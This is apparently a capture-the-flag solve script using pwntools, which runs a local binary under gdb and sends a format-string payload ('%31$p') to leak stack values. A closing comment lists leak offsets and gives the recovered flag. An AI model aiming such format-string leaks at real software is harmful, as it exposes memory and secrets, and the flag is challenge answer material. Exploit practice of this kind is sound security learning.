from pwn import *

local_bin = "./test"
elf = ELF(local_bin)
rop = ROP(elf)

#p = process(local_bin)
p = gdb.debug(local_bin, '''
	#break *main+53
	break *vuln+506
	continue
	''')

p.recvuntil(b'Name',timeout=1)
p.sendline(b'%31$p') #skip the front useless values on the stack

p.interactive()


'''
%33$p
%34$p
to 
%42$p --> this prints 0xa7d333935663161 (the a at the first char is trash since flag should end with } 0x7d)

actf{well_i'm_back_in_black_yes_i'm_back_in_the_stack_bec9b51294ead77684a1f593}
'''
